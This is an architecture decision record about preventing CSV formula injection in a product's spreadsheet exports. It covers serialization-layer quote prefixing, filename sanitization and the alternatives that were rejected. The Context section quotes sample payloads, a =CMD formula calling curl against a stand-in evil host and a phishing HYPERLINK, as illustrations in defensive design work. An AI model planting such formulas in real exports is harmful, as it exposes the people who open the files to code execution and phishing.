# ADR-024: CSV Export Formula Injection Prevention
## Context

Nexus exports CSV files in several places -- corrections reports, tax reconciliation exports, order history. Non-technical users open these files in Excel. That is the intended workflow.

CSV formula injection works like this: if a cell value starts with `=`, `+`, `-`, or `@`, Excel interprets it as a formula when the user opens the file. A malicious value like `=CMD('curl evil.com')` or `=HYPERLINK("https://phishing.example", "Click here")` can execute code or steal data when the CSV is opened.

The attack vector is especially tricky because the injection does not come from Nexus's own code -- the injected content comes from external systems (customer names from the ERP, notes fields, free-text memos) and passes through Nexus's CSV export without modification. Nexus was not generating formulas, but it was faithfully serializing them from upstream data.

A pre-deployment security audit (see ADR-021) flagged CSV formula injection risk in exports that include user-provided data. The same pattern could exist across any export path that serializes external data into CSV.

## Decision

**Two layers of defense:**

1. **Use Python's `csv.writer` for every CSV export.** The stdlib `csv` module handles quoting and escaping correctly for all cell values. It does not solve the formula injection problem by itself, but it eliminates the broader class of "wrote CSV with string concatenation" bugs.

2. **Prefix every cell value that starts with `=`, `+`, `-`, or `@` with a single quote (`'`).** Excel treats a leading single quote as "this is text, not a formula" -- the quote is not displayed in the cell, but the content is rendered literally. This is the industry-standard defense for CSV formula injection.

The fix is applied at the **serialization layer**, not at the ingestion layer. Values in the database can contain formula characters legitimately (a customer named "=Product" or a note field containing "=SUM(...)"). The sanitization happens when the CSV is written, not when the data is stored. This preserves round-trip integrity -- the database value is unchanged, and the CSV output is safe.

Also applied from the same audit: Content-Disposition filename sanitization. A user-supplied `corr_name` can contain path separators, quotes, or semicolons. The fix uses `werkzeug.utils.secure_filename()` or a strict regex allowlist for any user-supplied filename components.

## Alternatives Considered

- **Sanitize at ingestion instead of at export.** Would prevent the problem by never storing formula-like characters. Rejected because legitimate values contain these characters (customer names, notes referring to formulas, tax records containing negative amounts as "-100.00"). Blocking them at ingestion would corrupt real data.

- **Use a different export format (XLSX instead of CSV).** XLSX has richer typing that avoids the formula-vs-text ambiguity. Rejected because customers have asked for CSV specifically -- it is universal, opens in any tool, and integrates with their own downstream workflows. Switching formats unilaterally would break the customer workflow.

- **Use `csv.QUOTE_ALL` quoting mode.** Quotes every cell unconditionally. This does not actually prevent formula injection -- Excel still evaluates formulas even in quoted cells, because the quoting is for CSV parsing, not for formula evaluation.

- **Document the risk and tell users to be careful.** Rejected as hostile to non-technical users. The whole point of the export is that operators do not have to think about safety.

## Consequences

**Good:**
- The specific attack vector is blocked. A malicious `=CMD('...')` in a customer name becomes `'=CMD('...')` in the CSV, which Excel treats as text.
- The round-trip is preserved. Legitimate data with leading special characters survives export and can be re-imported or hand-edited without loss.
- The fix is localized to the CSV writing layer. New export endpoints inherit the protection automatically as long as they use `csv.writer` through the shared helper.

**Bad / costs:**
- Formula injection protection is easy to forget. Every new CSV export path has to go through the sanitization layer. The audit pattern (ADR-021) catches regressions but is not infallible.
- Power users who actually want formulas in their CSV are blocked. A user who wants to export data with computed totals has to generate the formulas in a downstream step.
- The single-quote prefix is visible in some CSV readers other than Excel. Nexus's customers use Excel almost exclusively, so this is a theoretical cost rather than a real one.

All CSV exports in `api/routes/v1/` use `csv.writer`. A shared helper sanitizes leading formula characters before `writerow`. `Content-Disposition` headers use `secure_filename()` or a strict regex allowlist for any user-supplied filename components.
